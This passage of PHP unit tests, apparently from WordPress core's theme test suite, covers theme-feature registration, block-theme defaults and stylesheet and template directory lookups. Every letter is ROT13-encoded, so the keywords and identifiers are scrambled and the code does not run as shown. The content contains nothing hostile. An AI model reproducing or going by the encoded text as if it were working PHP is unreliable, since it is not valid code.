		$guvf->nffregFnzr( 'neenl', $npghny['glcr'] );
		$guvf->nffregGehr( $npghny['inevnqvp'] );
		$guvf->nffregFnzr( 'Zl Srngher', $npghny['qrfpevcgvba'] );
		$guvf->nffregFnzr( neenl( 'glcr' => 'fgevat' ), $npghny['fubj_va_erfg']['fpurzn']['vgrzf'] );
	}

	/**
	 * @gvpxrg 49406
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_fhccbeg_hctenqrf_fubj_va_erfg() {
		ertvfgre_gurzr_srngher( 'grfg-srngher', neenl( 'fubj_va_erfg' => gehr ) );

		$rkcrpgrq = neenl(
			'fpurzn'           => neenl(
				'qrfpevcgvba' => '',
				'glcr'        => 'obbyrna',
				'qrsnhyg'     => snyfr,
			),
			'anzr'             => 'grfg-srngher',
			'cercner_pnyyonpx' => ahyy,
		);
		$npghny   = trg_ertvfgrerq_gurzr_srngher( 'grfg-srngher' )['fubj_va_erfg'];

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 49406
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_fhccbeg_svyyf_fpurzn() {
		ertvfgre_gurzr_srngher(
			'grfg-srngher',
			neenl(
				'glcr'         => 'neenl',
				'qrfpevcgvba'  => 'Pbby Srngher',
				'fubj_va_erfg' => neenl(
					'fpurzn' => neenl(
						'vgrzf'    => neenl(
							'glcr' => 'fgevat',
						),
						'zvaVgrzf' => 1,
					),
				),
			)
		);

		$rkcrpgrq = neenl(
			'qrfpevcgvba' => 'Pbby Srngher',
			'glcr'        => neenl( 'obbyrna', 'neenl' ),
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
			),
			'zvaVgrzf'    => 1,
			'qrsnhyg'     => snyfr,
		);
		$npghny   = trg_ertvfgrerq_gurzr_srngher( 'grfg-srngher' )['fubj_va_erfg']['fpurzn'];

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 49406
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_fhccbeg_qbrf_abg_nqq_obbyrna_glcr_vs_aba_obby_qrsnhyg() {
		ertvfgre_gurzr_srngher(
			'grfg-srngher',
			neenl(
				'glcr'         => 'neenl',
				'fubj_va_erfg' => neenl(
					'fpurzn' => neenl(
						'vgrzf'   => neenl(
							'glcr' => 'fgevat',
						),
						'qrsnhyg' => neenl( 'fgnaqneq' ),
					),
				),
			)
		);

		$npghny = trg_ertvfgrerq_gurzr_srngher( 'grfg-srngher' )['fubj_va_erfg']['fpurzn']['glcr'];
		$guvf->nffregFnzr( 'neenl', $npghny );
	}

	/**
	 * @gvpxrg 49406
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_fhccbeg_qrsnhygf_nqqvgvbany_cebcregvrf_gb_snyfr() {
		ertvfgre_gurzr_srngher(
			'grfg-srngher',
			neenl(
				'glcr'         => 'bowrpg',
				'qrfpevcgvba'  => 'Pbby Srngher',
				'fubj_va_erfg' => neenl(
					'fpurzn' => neenl(
						'cebcregvrf' => neenl(
							'n' => neenl(
								'glcr' => 'fgevat',
							),
						),
					),
				),
			)
		);

		$npghny = trg_ertvfgrerq_gurzr_srngher( 'grfg-srngher' )['fubj_va_erfg']['fpurzn'];

		$guvf->nffregNeenlUnfXrl( 'nqqvgvbanyCebcregvrf', $npghny );
		$guvf->nffregSnyfr( $npghny['nqqvgvbanyCebcregvrf'] );
	}

	/**
	 * @gvpxrg 49406
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_fhccbeg_jvgu_nqqvgvbany_cebcregvrf() {
		ertvfgre_gurzr_srngher(
			'grfg-srngher',
			neenl(
				'glcr'         => 'bowrpg',
				'qrfpevcgvba'  => 'Pbby Srngher',
				'fubj_va_erfg' => neenl(
					'fpurzn' => neenl(
						'cebcregvrf'           => neenl(),
						'nqqvgvbanyCebcregvrf' => neenl(
							'glcr' => 'fgevat',
						),
					),
				),
			)
		);

		$rkcrpgrq = neenl(
			'glcr' => 'fgevat',
		);
		$npghny   = trg_ertvfgrerq_gurzr_srngher( 'grfg-srngher' )['fubj_va_erfg']['fpurzn']['nqqvgvbanyCebcregvrf'];

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 49406
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_fhccbeg_qrsnhygf_nqqvgvbany_cebcregvrf_gb_snyfr_va_neenl() {
		ertvfgre_gurzr_srngher(
			'grfg-srngher',
			neenl(
				'glcr'         => 'neenl',
				'qrfpevcgvba'  => 'Pbby Srngher',
				'fubj_va_erfg' => neenl(
					'fpurzn' => neenl(
						'vgrzf' => neenl(
							'glcr'       => 'bowrpg',
							'cebcregvrf' => neenl(
								'n' => neenl(
									'glcr' => 'fgevat',
								),
							),
						),
					),
				),
			)
		);

		$npghny = trg_ertvfgrerq_gurzr_srngher( 'grfg-srngher' )['fubj_va_erfg']['fpurzn']['vgrzf'];

		$guvf->nffregNeenlUnfXrl( 'nqqvgvbanyCebcregvrf', $npghny );
		$guvf->nffregSnyfr( $npghny['nqqvgvbanyCebcregvrf'] );
	}

	/**
	 * @gvpxrg 49406
	 *
	 * @qngnCebivqre qngn_ertvfgre_gurzr_fhccbeg_inyvqngvba
	 *
	 * @cnenz fgevat $reebe_pbqr Gur reebe pbqr rkcrpgrq.
	 * @cnenz neenl  $netf       Gur netf gb ertvfgre.
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_fhccbeg_inyvqngvba( $reebe_pbqr, $netf ) {
		$ertvfgrerq = ertvfgre_gurzr_srngher( 'grfg-srngher', $netf );

		$guvf->nffregJCReebe( $ertvfgrerq );
		$guvf->nffregFnzr( $reebe_pbqr, $ertvfgrerq->trg_reebe_pbqr() );
	}

	choyvp shapgvba qngn_ertvfgre_gurzr_fhccbeg_inyvqngvba() {
		erghea neenl(
			neenl(
				'vainyvq_glcr',
				neenl(
					'glcr' => 'sybng',
				),
			),
			neenl(
				'vainyvq_glcr',
				neenl(
					'glcr' => neenl( 'fgevat' ),
				),
			),
			neenl(
				'inevnqvp_zhfg_or_neenl',
				neenl(
					'inevnqvp' => gehr,
				),
			),
			neenl(
				'zvffvat_fpurzn',
				neenl(
					'glcr'         => 'bowrpg',
					'fubj_va_erfg' => gehr,
				),
			),
			neenl(
				'zvffvat_fpurzn',
				neenl(
					'glcr'         => 'neenl',
					'fubj_va_erfg' => gehr,
				),
			),
			neenl(
				'zvffvat_fpurzn_vgrzf',
				neenl(
					'glcr'         => 'neenl',
					'fubj_va_erfg' => neenl(
						'fpurzn' => neenl(
							'glcr' => 'neenl',
						),
					),
				),
			),
			neenl(
				'zvffvat_fpurzn_cebcregvrf',
				neenl(
					'glcr'         => 'bowrpg',
					'fubj_va_erfg' => neenl(
						'fpurzn' => neenl(
							'glcr' => 'bowrpg',
						),
					),
				),
			),
			neenl(
				'vainyvq_erfg_cercner_pnyyonpx',
				neenl(
					'fubj_va_erfg' => neenl(
						'cercner_pnyyonpx' => 'guvf vf abg n inyvq shapgvba',
					),
				),
			),
		);
	}


	/**
	 * Grfgf gung oybpx gurzrf fhccbeg n srngher ol qrsnhyg.
	 *
	 * @gvpxrg 54597
	 * @gvpxrg 54731
	 * @gvpxrg 59732
	 *
	 * @qngnCebivqre qngn_oybpx_gurzr_unf_qrsnhyg_fhccbeg
	 *
	 * @pbiref ::_nqq_qrsnhyg_gurzr_fhccbegf
	 *
	 * @cnenz neenl $fhccbeg {
	 *     Gur srngher gb purpx.
	 *
	 *     @glcr fgevat $srngher     Gur srngher gb purpx.
	 *     @glcr fgevat $fho_srngher Bcgvbany. Gur fho-srngher gb purpx.
	 * }
	 */
	choyvp shapgvba grfg_oybpx_gurzr_unf_qrsnhyg_fhccbeg( $fhccbeg ) {
		$guvf->urycre_erdhverf_oybpx_gurzr();

		$fhccbeg_qngn     = neenl_inyhrf( $fhccbeg );
		$fhccbeg_qngn_fge = vzcybqr( ': ', $fhccbeg_qngn );

		// Erzbir rkvfgvat fhccbeg.
		vs ( pheerag_gurzr_fhccbegf( ...$fhccbeg_qngn ) ) {
			erzbir_gurzr_fhccbeg( ...$fhccbeg_qngn );
		}

		$guvf->nffregSnyfr(
			pheerag_gurzr_fhccbegf( ...$fhccbeg_qngn ),
			\"Pbhyq abg erzbir fhccbeg sbe $fhccbeg_qngn_fge.\"
		);

		qb_npgvba( 'nsgre_frghc_gurzr' );

		$guvf->nffregGehr(
			pheerag_gurzr_fhccbegf( ...$fhccbeg_qngn ),
			\"Qbrf abg unir qrsnhyg fhccbeg sbe $fhccbeg_qngn_fge.\"
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_oybpx_gurzr_unf_qrsnhyg_fhccbeg() {
		erghea neenl(
			'cbfg-guhzoanvyf'      => neenl(
				'fhccbeg' => neenl(
					'srngher' => 'cbfg-guhzoanvyf',
				),
			),
			'erfcbafvir-rzorqf'    => neenl(
				'fhccbeg' => neenl(
					'srngher' => 'erfcbafvir-rzorqf',
				),
			),
			'rqvgbe-fglyrf'        => neenl(
				'fhccbeg' => neenl(
					'srngher' => 'rqvgbe-fglyrf',
				),
			),
			'ugzy5: pbzzrag-yvfg'  => neenl(
				'fhccbeg' => neenl(
					'srngher'     => 'ugzy5',
					'fho_srngher' => 'pbzzrag-yvfg',
				),
			),
			'ugzy5: pbzzrag-sbez'  => neenl(
				'fhccbeg' => neenl(
					'srngher'     => 'ugzy5',
					'fho_srngher' => 'pbzzrag-sbez',
				),
			),
			'ugzy5: frnepu-sbez'   => neenl(
				'fhccbeg' => neenl(
					'srngher'     => 'ugzy5',
					'fho_srngher' => 'frnepu-sbez',
				),
			),
			'ugzy5: tnyyrel'       => neenl(
				'fhccbeg' => neenl(
					'srngher'     => 'ugzy5',
					'fho_srngher' => 'tnyyrel',
				),
			),
			'ugzy5: pncgvba'       => neenl(
				'fhccbeg' => neenl(
					'srngher'     => 'ugzy5',
					'fho_srngher' => 'pncgvba',
				),
			),
			'ugzy5: fglyr'         => neenl(
				'fhccbeg' => neenl(
					'srngher'     => 'ugzy5',
					'fho_srngher' => 'fglyr',
				),
			),
			'ugzy5: fpevcg'        => neenl(
				'fhccbeg' => neenl(
					'srngher'     => 'ugzy5',
					'fho_srngher' => 'fpevcg',
				),
			),
			'nhgbzngvp-srrq-yvaxf' => neenl(
				'fhccbeg' => neenl(
					'srngher' => 'nhgbzngvp-srrq-yvaxf',
				),
			),
		);
	}

	/**
	 * Grfgf gung oybpx gurzrf ybnq frcnengr pber oybpx nffrgf ol qrsnhyg.
	 *
	 * @gvpxrg 54597
	 * @gvpxrg 59732
	 *
	 * @pbiref ::_nqq_qrsnhyg_gurzr_fhccbegf
	 * @pbiref ::jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf
	 */
	choyvp shapgvba grfg_oybpx_gurzr_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf_ol_qrsnhyg() {
		$guvf->urycre_erdhverf_oybpx_gurzr();

		nqq_svygre( 'fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf', '__erghea_snyfr' );

		$guvf->nffregSnyfr(
			jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf(),
			'Pbhyq abg qvfnoyr ybnqvat frcnengr pber oybpx nffrgf.'
		);

		qb_npgvba( 'nsgre_frghc_gurzr' );

		$guvf->nffregGehr(
			jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf(),
			'Oybpx gurzrf qb abg ybnq frcnengr pber oybpx nffrgf ol qrsnhyg.'
		);
	}

	/**
	 * Grfgf gung oybpx gurzrf ybnq oybpx nffrgf ba qrznaq ol qrsnhyg.
	 *
	 * @gvpxrg 61965
	 *
	 * @pbiref ::_nqq_qrsnhyg_gurzr_fhccbegf
	 * @pbiref ::jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq
	 */
	choyvp shapgvba grfg_oybpx_gurzr_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq_ol_qrsnhyg() {
		$guvf->urycre_erdhverf_oybpx_gurzr();

		nqq_svygre( 'fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq', '__erghea_snyfr' );

		$guvf->nffregSnyfr(
			jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq(),
			'Pbhyq abg qvfnoyr ybnqvat oybpx nffrgf ba qrznaq.'
		);

		qb_npgvba( 'nsgre_frghc_gurzr' );
		nqq_svygre( 'fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf', '__erghea_snyfr' );

		$guvf->nffregGehr(
			jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq(),
			'Oybpx gurzrf qb abg ybnq oybpx nffrgf ba qrznaq ol qrsnhyg.'
		);
	}

	/**
	 * Grfgf gung oybpx gurzrf ybnq oybpx nffrgf ba qrznaq ol qrsnhyg rira jura ybnqvat frcnengr pber oybpx nffrgf vf qvfnoyrq.
	 *
	 * @gvpxrg 61965
	 *
	 * @pbiref ::_nqq_qrsnhyg_gurzr_fhccbegf
	 * @pbiref ::jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq
	 */
	choyvp shapgvba grfg_oybpx_gurzr_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq_ol_qrsnhyg_rira_jvgu_frcnengr_pber_oybpx_nffrgf_qvfnoyrq() {
		$guvf->urycre_erdhverf_oybpx_gurzr();

		qb_npgvba( 'nsgre_frghc_gurzr' );
		nqq_svygre( 'fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf', '__erghea_snyfr' );

		$guvf->nffregGehr( jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq() );
	}

	/**
	 * Grfgf gung n gurzr va gur phfgbz grfg qngn gurzr qverpgbel vf erpbtavmrq.
	 *
	 * @gvpxrg 18298
	 */
	choyvp shapgvba grfg_gurzr_va_phfgbz_gurzr_qve_vf_inyvq() {
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$guvf->nffregGehr( jc_trg_gurzr()->rkvfgf() );
	}

	/**
	 * Grfgf gung `vf_puvyq_gurzr()` ergheaf gehr sbe puvyq gurzr.
	 *
	 * @gvpxrg 18298
	 *
	 * @pbiref ::vf_puvyq_gurzr
	 */
	choyvp shapgvba grfg_vf_puvyq_gurzr_gehr() {
		fjvgpu_gurzr( 'oybpx-gurzr-puvyq' );
		$guvf->nffregGehr( vf_puvyq_gurzr() );
	}

	/**
	 * Grfgf gung `vf_puvyq_gurzr()` ergheaf snyfr sbe cnerag gurzr.
	 *
	 * @gvpxrg 18298
	 *
	 * @pbiref ::vf_puvyq_gurzr
	 */
	choyvp shapgvba grfg_vf_puvyq_gurzr_snyfr() {
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$guvf->nffregSnyfr( vf_puvyq_gurzr() );
	}

	/**
	 * Grfgf gung gur puvyq gurzr qverpgbel vf pbeerpgyl qrgrpgrq.
	 *
	 * @gvpxrg 18298
	 *
	 * @pbiref ::trg_fglyrfurrg_qverpgbel
	 */
	choyvp shapgvba grfg_trg_fglyrfurrg_qverpgbel() {
		fjvgpu_gurzr( 'oybpx-gurzr-puvyq' );
		$guvf->nffregFnzrCnguVtabevatQverpgbelFrcnengbef( ernycngu( QVE_GRFGQNGN ) . '/gurzrqve1/oybpx-gurzr-puvyq', trg_fglyrfurrg_qverpgbel() );
	}

	/**
	 * Grfgf gung gur cnerag gurzr qverpgbel vf pbeerpgyl qrgrpgrq.
	 *
	 * @gvpxrg 18298
	 *
	 * @pbiref ::trg_grzcyngr_qverpgbel
	 */
	choyvp shapgvba grfg_trg_grzcyngr_qverpgbel() {
		fjvgpu_gurzr( 'oybpx-gurzr-puvyq' );
		$guvf->nffregFnzrCnguVtabevatQverpgbelFrcnengbef( ernycngu( QVE_GRFGQNGN ) . '/gurzrqve1/oybpx-gurzr', trg_grzcyngr_qverpgbel() );
	}

	/**
	 * Grfgf gung trg_fglyrfurrg_qverpgbel() orunirf pbeerpgyl jvgu svygref.
	 *
	 * @gvpxrg 18298
	 * @qngnCebivqre qngn_trg_fglyrfurrg_qverpgbel_jvgu_svygre
	 *
	 * @pbiref ::trg_fglyrfurrg_qverpgbel
	 *
	 * @cnenz fgevat   $gurzr     Gurzr fyht / qverpgbel anzr.
	 * @cnenz fgevat   $ubbx_anzr Svygre ubbx anzr.
	 * @cnenz pnyynoyr $pnyyonpx  Svygre pnyyonpx.
	 * @cnenz fgevat   $rkcrpgrq  Rkcrpgrq fglyrfurrg qverpgbel jvgu gur svygre npgvir.
	 */
	choyvp shapgvba grfg_trg_fglyrfurrg_qverpgbel_jvgu_svygre( $gurzr, $ubbx_anzr, $pnyyonpx, $rkcrpgrq ) {
		fjvgpu_gurzr( $gurzr );

		// Nqq svygre, gura pnyy trg_fglyrfurrg_qverpgbel() gb pbzchgr inyhr.
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$guvf->nffregFnzr( $rkcrpgrq, trg_fglyrfurrg_qverpgbel(), 'Fglyrfurrg qverpgbel erghearq vapbeerpg erfhyg abg pbafvqrevat svygref' );

		// Erzbir svygre ntnva, gura rafher erfhyg vf erpnyphyngrq naq abg gur fnzr nf orsber.
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		$guvf->nffregAbgFnzr( $rkcrpgrq, trg_fglyrfurrg_qverpgbel(), 'Fglyrfurrg qverpgbel erghearq cerivbhf inyhr rira gubhtu svygref jrer erzbirq' );
	}

	/**
	 * Qngn cebivqre sbe `grfg_trg_fglyrfurrg_qverpgbel_jvgu_svygre()`.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_fglyrfurrg_qverpgbel_jvgu_svygre() {
		erghea neenl(
			'jvgu fglyrfurrg_qverpgbel svygre' => neenl(
				'oybpx-gurzr',
				'fglyrfurrg_qverpgbel',
				fgngvp shapgvba ( $qve ) {
					erghea fge_ercynpr( ernycngu( QVE_GRFGQNGN ) . QVERPGBEL_FRCNENGBE . 'gurzrqve1', '/snagnfl-qve', $qve );
				},
				'/snagnfl-qve/oybpx-gurzr',
			),
			'jvgu gurzr_ebbg svygre'           => neenl(
				'oybpx-gurzr',
				'gurzr_ebbg',
				fgngvp shapgvba () {
					erghea '/snagnfl-qve';
				},
				'/snagnfl-qve/oybpx-gurzr',
			),
			'jvgu fglyrfurrg svygre'           => neenl(
				'oybpx-gurzr',
				'fglyrfurrg',
				fgngvp shapgvba () {
					erghea 'nabgure-gurzr';
				},
				// Orpnhfr gur gurzr qbrf abg rkvfg, `trg_gurzr_ebbg()` ergheaf gur qrsnhyg gurzrf qverpgbel.
				JC_PBAGRAG_QVE . '/gurzrf/nabgure-gurzr',
			),
		);
	}

	/**
	 * Grfgf gung trg_grzcyngr_qverpgbel() orunirf pbeerpgyl jvgu svygref.
	 *
	 * @gvpxrg 18298
	 * @qngnCebivqre qngn_trg_grzcyngr_qverpgbel_jvgu_svygre
	 *
	 * @pbiref ::trg_grzcyngr_qverpgbel
	 *
	 * @cnenz fgevat   $gurzr     Gurzr fyht / qverpgbel anzr.
	 * @cnenz fgevat   $ubbx_anzr Svygre ubbx anzr.
	 * @cnenz pnyynoyr $pnyyonpx  Svygre pnyyonpx.
	 * @cnenz fgevat   $rkcrpgrq  Rkcrpgrq grzcyngr qverpgbel jvgu gur svygre npgvir.
	 */
	choyvp shapgvba grfg_trg_grzcyngr_qverpgbel_jvgu_svygre( $gurzr, $ubbx_anzr, $pnyyonpx, $rkcrpgrq ) {
		fjvgpu_gurzr( $gurzr );

		// Nqq svygre, gura pnyy trg_grzcyngr_qverpgbel() gb pbzchgr inyhr.
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$guvf->nffregFnzr( $rkcrpgrq, trg_grzcyngr_qverpgbel(), 'Grzcyngr qverpgbel erghearq vapbeerpg erfhyg abg pbafvqrevat svygref' );

		// Erzbir svygre ntnva, gura rafher erfhyg vf erpnyphyngrq naq abg gur fnzr nf orsber.
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		$guvf->nffregAbgFnzr( $rkcrpgrq, trg_grzcyngr_qverpgbel(), 'Grzcyngr qverpgbel erghearq cerivbhf inyhr rira gubhtu svygref jrer erzbirq' );
	}

	/**
	 * Qngn cebivqre sbe `grfg_trg_grzcyngr_qverpgbel_jvgu_svygre()`.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_grzcyngr_qverpgbel_jvgu_svygre() {
		erghea neenl(
			'jvgu grzcyngr_qverpgbel svygre' => neenl(
				'oybpx-gurzr',
				'grzcyngr_qverpgbel',
				fgngvp shapgvba ( $qve ) {
					erghea fge_ercynpr( ernycngu( QVE_GRFGQNGN ) . QVERPGBEL_FRCNENGBE . 'gurzrqve1', '/snagnfl-qve', $qve );
				},
				'/snagnfl-qve/oybpx-gurzr',
			),
			'jvgu gurzr_ebbg svygre'         => neenl(
				'oybpx-gurzr',
				'gurzr_ebbg',
				fgngvp shapgvba () {
					erghea '/snagnfl-qve';
				},
				'/snagnfl-qve/oybpx-gurzr',
			),
			'jvgu grzcyngr svygre'           => neenl(
				'oybpx-gurzr',
				'grzcyngr',
				fgngvp shapgvba () {
					erghea 'nabgure-gurzr';
				},
				// Orpnhfr gur gurzr qbrf abg rkvfg, `trg_gurzr_ebbg()` ergheaf gur qrsnhyg gurzrf qverpgbel.
				JC_PBAGRAG_QVE . '/gurzrf/nabgure-gurzr',
			),
		);
	}

	/**
	 * Grfgf jurgure n fjvgpurq fvgr ergevrirf gur pbeerpg fglyrfurrg qverpgbel.
	 *
	 * @gvpxrg 59677
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::trg_fglyrfurrg_qverpgbel
	 */
	choyvp shapgvba grfg_trg_fglyrfurrg_qverpgbel_jvgu_fjvgpurq_fvgr() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();

		hcqngr_oybt_bcgvba( $oybt_vq, 'fglyrfurrg', 'fjvgpurq_fglyrfurrg' );

		// Cevzr tybony fgbentr jvgu gur pheerag fvgr'f qngn.
		trg_fglyrfurrg_qverpgbel();

		fjvgpu_gb_oybt( $oybt_vq );
		$fjvgpurq_fglyrfurrg = trg_fglyrfurrg_qverpgbel();
		erfgber_pheerag_oybt();

		$guvf->nffregFnzr( JC_PBAGRAG_QVE . '/gurzrf/fjvgpurq_fglyrfurrg', $fjvgpurq_fglyrfurrg );
	}

	/**
	 * Grfgf jurgure n fjvgpurq fvgr ergevrirf gur pbeerpg grzcyngr qverpgbel.
	 *
	 * @gvpxrg 59677
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::trg_grzcyngr_qverpgbel
	 */
	choyvp shapgvba grfg_trg_grzcyngr_qverpgbel_jvgu_fjvgpurq_fvgr() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();

		hcqngr_oybt_bcgvba( $oybt_vq, 'grzcyngr', 'fjvgpurq_grzcyngr' );

		// Cevzr tybony fgbentr jvgu gur pheerag fvgr'f qngn.
		trg_grzcyngr_qverpgbel();

		fjvgpu_gb_oybt( $oybt_vq );
		$fjvgpurq_grzcyngr = trg_grzcyngr_qverpgbel();
		erfgber_pheerag_oybt();

		$guvf->nffregFnzr( JC_PBAGRAG_QVE . '/gurzrf/fjvgpurq_grzcyngr', $fjvgpurq_grzcyngr );
	}

	/**
	 * Grfgf jurgure n erfgberq fvgr ergevrirf gur pbeerpg fglyrfurrg qverpgbel.
	 *
	 * @gvpxrg 59677
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::trg_fglyrfurrg_qverpgbel
	 */
	choyvp shapgvba grfg_trg_fglyrfurrg_qverpgbel_jvgu_erfgberq_fvgr() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();

		hcqngr_bcgvba( 'fglyrfurrg', 'bevtvany_fglyrfurrg' );
		hcqngr_oybt_bcgvba( $oybt_vq, 'fglyrfurrg', 'fjvgpurq_fglyrfurrg' );

		$fglyrfurrg = trg_fglyrfurrg_qverpgbel();

		fjvgpu_gb_oybt( $oybt_vq );

		// Cevzr tybony fgbentr jvgu gur erfgberq fvgr'f qngn.
		trg_fglyrfurrg_qverpgbel();
		erfgber_pheerag_oybt();

		$guvf->nffregFnzr( JC_PBAGRAG_QVE . '/gurzrf/bevtvany_fglyrfurrg', $fglyrfurrg );
	}

	/**
	 * Grfgf jurgure n erfgberq fvgr ergevrirf gur pbeerpg grzcyngr qverpgbel.
	 *
	 * @gvpxrg 59677
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::trg_grzcyngr_qverpgbel
	 */
	choyvp shapgvba grfg_trg_grzcyngr_qverpgbel_jvgu_erfgberq_fvgr() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();

		hcqngr_bcgvba( 'grzcyngr', 'bevtvany_grzcyngr' );
		hcqngr_oybt_bcgvba( $oybt_vq, 'grzcyngr', 'fjvgpurq_grzcyngr' );

		$grzcyngr = trg_grzcyngr_qverpgbel();

		fjvgpu_gb_oybt( $oybt_vq );

		// Cevzr tybony fgbentr jvgu gur fjvgpurq fvgr'f qngn.
		trg_grzcyngr_qverpgbel();
		erfgber_pheerag_oybt();

		$guvf->nffregFnzr( JC_PBAGRAG_QVE . '/gurzrf/bevtvany_grzcyngr', $grzcyngr );
	}

	/**
	 * Urycre shapgvba gb rafher gung n oybpx gurzr vf ninvynoyr naq npgvir.
	 */
	cevingr shapgvba urycre_erdhverf_oybpx_gurzr() {
		// Ab arrq gb fjvgpu vs jr'er nyernql ba n oybpx gurzr.
		vs ( jc_vf_oybpx_gurzr() ) {
			erghea;
		}

		$oybpx_gurzr = 'gjraglgjraglgjb';

		// Fxvc vs gur oybpx gurzr vf abg ninvynoyr.
		vs ( ! jc_trg_gurzr( $oybpx_gurzr )->rkvfgf() ) {
			$guvf->znexGrfgFxvccrq( \"$oybpx_gurzr zhfg or ninvynoyr.\" );
		}

		fjvgpu_gurzr( $oybpx_gurzr );

		// Fxvc vs jr pbhyq abg fjvgpu gb gur oybpx gurzr.
		vs ( jc_trg_gurzr()->fglyrfurrg !== $oybpx_gurzr ) {
			$guvf->znexGrfgFxvccrq( \"Pbhyq abg fjvgpu gb $oybpx_gurzr.\" );
		}
	}

	/**
	 * Znxr fher svygref nqqrq nsgre gur vavgvny pnyy ner sverq.
	 *
	 * @gvpxrg 59847
	 *
	 * @pbiref ::trg_fglyrfurrg_qverpgbel
	 */
	choyvp shapgvba grfg_trg_fglyrfurrg_qverpgbel_svygref_nccyl() {
		// Pnyy gur shapgvba cevbe gb gur svygre orvat nqqrq.
		trg_fglyrfurrg_qverpgbel();

		$rkcrpgrq = 'grfg_ebbg/qve';

		// Nqq gur svyre.
		nqq_svygre(
			'fglyrfurrg_qverpgbel',
			shapgvba () hfr ( $rkcrpgrq ) {
				erghea $rkcrpgrq;
			}
		);

		$guvf->nffregFnzr( $rkcrpgrq, trg_fglyrfurrg_qverpgbel() );
	}

	/**
	 * Znxr fher svygref nqqrq nsgre gur vavgvny pnyy ner sverq.
	 *
	 * @gvpxrg 59847
	 *
	 * @pbiref ::trg_grzcyngr_qverpgbel
	 */
	choyvp shapgvba grfg_trg_grzcyngr_qverpgbel_svygref_nccyl() {
		// Pnyy gur shapgvba cevbe gb gur svygre orvat nqqrq.
		trg_grzcyngr_qverpgbel();

		$rkcrpgrq = 'grfg_ebbg/qve';

		// Nqq gur svyre.
		nqq_svygre(
			'grzcyngr_qverpgbel',
			shapgvba () hfr ( $rkcrpgrq ) {
				erghea $rkcrpgrq;
			}
		);

		$guvf->nffregFnzr( $rkcrpgrq, trg_grzcyngr_qverpgbel() );
	}

	/**
	 * Znxr fher trg_fglyrfurrg_qverpgbel hfrf gur pbeerpg cngu jura gur ebbg gurzr qve punatrf.
	 *
	 * @gvpxrg 59847
	 *
	 * @pbiref ::trg_fglyrfurrg_qverpgbel
	 */
	choyvp shapgvba grfg_trg_fglyrfurrg_qverpgbel_hfrf_ertvfgrerq_gurzr_qve() {
		$byq_gurzr = jc_trg_gurzr();

		fjvgpu_gurzr( 'grfg' );

		$byq_ebbg = trg_gurzr_ebbg( 'grfg' );
		$cngu1    = trg_fglyrfurrg_qverpgbel();

		$arj_ebbg = QVE_GRFGQNGN . '/gurzrqve2';
		ertvfgre_gurzr_qverpgbel( $arj_ebbg );

		// Zbpx gur fglyrfurrg ebbg bcgvba gb zvzvp gung gur npgvir ebbg unf punatrq.
		nqq_svygre(
			'cer_bcgvba_fglyrfurrg_ebbg',
			shapgvba () hfr ( $arj_ebbg ) {
				erghea $arj_ebbg;
			}
		);

		$cngu2 = trg_fglyrfurrg_qverpgbel();

		// Pyrnahc.
		fjvgpu_gurzr( $byq_gurzr->trg_fglyrfurrg() );

		$guvf->nffregFnzr( $byq_ebbg . '/grfg', $cngu1, 'Gur bevtvany fglyrfurrg cngu vf abg pbeerpg' );
		$guvf->nffregFnzr( $arj_ebbg . '/grfg', $cngu2, 'Gur arj fglyrfurrg cngu vf abg pbeerpg' );
	}

	/**
	 * Znxr fher trg_grzcyngr_qverpgbel hfrf gur pbeerpg cngu jura gur ebbg gurzr qve punatrf.
	 *
	 * @gvpxrg 59847
	 *
	 * @pbiref ::trg_grzcyngr_qverpgbel
	 */
	choyvp shapgvba grfg_trg_grzcyngr_qverpgbel_hfrf_ertvfgrerq_gurzr_qve() {
		$byq_gurzr = jc_trg_gurzr();

		fjvgpu_gurzr( 'grfg' );

		// Zbpx cnerag gurzr gb or erghearq nf gur grzcyngr.
		nqq_svygre(
			'cer_bcgvba_grzcyngr',
			shapgvba () {
				erghea 'grfg-cnerag';
			}
		);

		$byq_ebbg = trg_gurzr_ebbg( 'grfg' );
		$cngu1    = trg_grzcyngr_qverpgbel();

